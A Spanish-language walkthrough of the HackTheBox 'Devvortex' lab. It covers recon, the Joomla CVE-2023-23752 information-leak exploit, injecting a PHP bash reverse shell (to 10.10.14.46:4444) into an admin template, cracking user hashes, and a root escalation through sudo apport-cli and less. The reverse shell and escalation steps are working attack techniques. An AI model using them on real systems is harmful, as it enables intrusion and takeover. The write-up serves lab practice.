
# Devvortex

## <mark style="color:purple;">Primer acceso</mark>

Accedemos a la IP `10.10.11.242` a través del navegador. Añadimos `devvortex.htb` a nuestro archivo `etc/hosts` y ya nos aparece:

<figure><img src="/files/i3caNV19Fo1WjHUw55Vh" alt=""><figcaption></figcaption></figure>

A priori parece una web de una compañía de desarrollo web.

## <mark style="color:purple;">Escaneo con Nmap</mark>

```bash
sudo nmap -v -sS -sV 10.10.11.242
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Solo tiene abiertos los 2 puertos típicos, ssh y http, en principio nada interesante.

## <mark style="color:purple;">Fuzzing</mark>

Al fuzzear con dirsearch  nos encontramos varios directorios, pero que al acceder nos dan un forbidden:

```bash
dirsearch -u devvortex.htb -x 403,404
 
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/_devvortex.htb/_23-11-28_00-26-53.txt

Target: http://devvortex.htb/

[00:26:54] Starting: 
[00:26:55] 301 -  178B  - /js  ->  http://devvortex.htb/js/
[00:27:11] 200 -    7KB - /about.html
[00:27:37] 200 -    9KB - /contact.html
[00:27:39] 301 -  178B  - /css  ->  http://devvortex.htb/css/
[00:27:50] 301 -  178B  - /images  ->  http://devvortex.htb/images/
```

Bueno, parece un callejón sin salida. En esta etapa, podrían venir a la mente tres posibilidades:

1. No hay nada explotable en el sitio web principal
2. No hay directorios ni archivos ocultos interesantes
3. Estamos en un punto muerto

Utilizando Gobuster, tenemos la opción de encontrar vhosts o pantallas de desarrollo o en pre-producción, por lo que vamos a utilizar el siguiente comando:

{% code overflow="wrap" %}

```bash
gobuster vhost -u devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

{% endcode %}

Encontramos el subdominio `dev.devvortex.htb`, lo que aumenta nuestra superficie de ataque.

<figure><img src="/files/lCjzkh8JW5YKwsmQwSRV" alt=""><figcaption></figcaption></figure>

Ejecutando dirsearch de nuevo contra este subdominio nos encontramos cosas interesantes:

<figure><img src="/files/7rILTYd9xD9NNe8hMHno" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/0Po7JyRI2lkQgJV4ZuA8" alt=""><figcaption></figcaption></figure>

Encontramos pantallas de administrador y logs, lo que nos puede ayudar a encontrar usuarios y/o credenciales, y archivos de configuración del sitio web.

Al acceder a `/administrator` nos salta un login de Joomla:

<figure><img src="/files/VOR9u9BnT6rbKxd9sWFK" alt=""><figcaption></figcaption></figure>

Si ejecutamos Joomscan nos encontramos con que usa la versión 4.2.6, por lo que buscaremos un exploit para esta versión:

<figure><img src="/files/INguTPGbzft8tJ7XQnqY" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Exploit</mark>

Buscando un exploit para esta versión de Joomla nos encontramos con este exploit en Github, con el CVE-2023-23752 asociado:

{% embed url="<https://github.com/Acceis/exploit-CVE-2023-23752>" %}

Seguimos las instrucciones de instalación del repo y lo ejecutamos de la siguiente manera:

```bash
# Instalación
git clone https://github.com/Acceis/exploit-CVE-2023-23752.git
cd exploit-CVE-2023-23752.git
gem install httpx docopt paint

# Ejecutamos el exploit
sudo ruby exploit.rb http://dev.devvortex.htb
```

El exploit funciona y descubrimos dos usuarios, uno de ellos administrador, y el acceso a una base de datos MySql con usuario y contraseña:

```bash
❯ sudo ruby exploit.rb http://dev.devvortex.htb 

Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

A la base de datos solo nos podemos conectar por localhost, por lo que necesitamos estar dentro para acceder. Al intentar conectarnos por SSH con las credenciales no funcionan, así que vamos a loguearnos en el panel de Joomla con la cuenta de administrador:

```
Usuario:  lewis
Password: P4ntherg0t1n5r3c0n##
```

<figure><img src="/files/dLVNREQZBfvD6LfIW4PY" alt=""><figcaption></figcaption></figure>

Nuestro objetivo aquí es encontrar una página para añadir código y establecer una reverse shell con la máquina, por lo que vamos a ir a System > Administrator templates

<figure><img src="/files/o7iGCENQzP2ovdxWgRoi" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/i55kBYNX9kuear49aWaq" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/iR1F9Fu1ItFhonJjS8SX" alt=""><figcaption></figcaption></figure>

Como podemos ver, hay varios códigos PHP ejecutándose dentro de nuestra plantilla. Abrimos login.php e inyectamos nuestro código para ejecutar un comando bash y luego guardemos los cambios.

{% code title="Reverse Shell" %}

```bash
bash -i >& /dev/tcp/10.10.14.46/4444 0>&1
```

{% endcode %}

```php
# Pegamos esto
system('bash -c "bash -i >& /dev/tcp/10.10.14.46/4444 0>&1"');
```

<figure><img src="/files/Np6EtMSvMmgXTaOK2fqE" alt=""><figcaption></figcaption></figure>

Abrimos un netcat listener y accedemos a `http://dev.devvortex.htb/administrator/templates/atum/login.php` y obtenemos la reverse shell:

<figure><img src="/files/3M549b0VO6xHhUUyOV7S" alt=""><figcaption></figcaption></figure>

Accedemos a /etc/passwd y vemos que logan puede ejecutar comandos desde /home/logan

<figure><img src="/files/ZtyqBKauZ0XBtN8w6RgV" alt=""><figcaption></figcaption></figure>

Vamos a importar pty con python y a acceder a la base de datos MySql con las credenciales que descubrimos anteriormente:

<figure><img src="/files/F61wZGx1FOGvTZ0mcceg" alt=""><figcaption></figcaption></figure>

Mirando las tablas de la base de datos nos encontramos con la tabla `sd4fg_users` que es la que contiene información de los usuarios y su contraseña en formato de hash.

<figure><img src="/files/xVHOjztetJswXDyrCmHc" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/uQ1D5OW3rarjFaafczxm" alt=""><figcaption></figcaption></figure>

Al acceder a esa tabla efectivamente encontramos los 2 hashes de los usuarios lewis y logan.

<figure><img src="/files/2zaYXOd3lu9k7aGZPLu3" alt=""><figcaption></figcaption></figure>

Ahora vamos a crackearlos. Nos interesa sobre todo crackear el hash de Logan, ya que es el usuario que tiene permisos para ejecutar comandos.

```
lewis: $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
logan: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

<figure><img src="/files/1iVkULkPmbWZs4EVWbrU" alt=""><figcaption></figcaption></figure>

Ya tenemos usuario y contraseña para acceder por SSH:

```
Usuario:   logan
Password:  tequieromucho
```

<figure><img src="/files/fpPfB5DcWDrWEcg9bGHe" alt=""><figcaption></figcaption></figure>

Accedemos correctamente y obtenemos el `user.txt`  🏆

<figure><img src="/files/qNZzLc0D5YGlKfFoQUh9" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Escalada de Privilegios</mark>

Con `sudo -l` vemos los permisos que tiene Logan en el sistema:

<figure><img src="/files/bNq6X9W4JJGW8TQ05aXK" alt=""><figcaption></figcaption></figure>

{% embed url="<https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb?source=post_page-----d2fbd862027e-------------------------------->" %}

Vamos a ejecutar el siguiente comando y le decimos 'V' cuando nos de la opción de elegir:

```bash
sudo /usr/bin/apport-cli -c test.log less
```

<figure><img src="/files/TJfLzL2ia9zvhha8n5h1" alt=""><figcaption></figcaption></figure>

En este punto solo tenemos que ejecutar el siguiente comando para volvernos root:

```bash
!/bin/bash
```

<figure><img src="/files/xLjAOeP2nXdT933nJxwE" alt=""><figcaption></figcaption></figure>

Y ya somos root!&#x20;

<figure><img src="/files/Rh32LuKpEfXRu5gnqd7E" alt=""><figcaption></figcaption></figure>
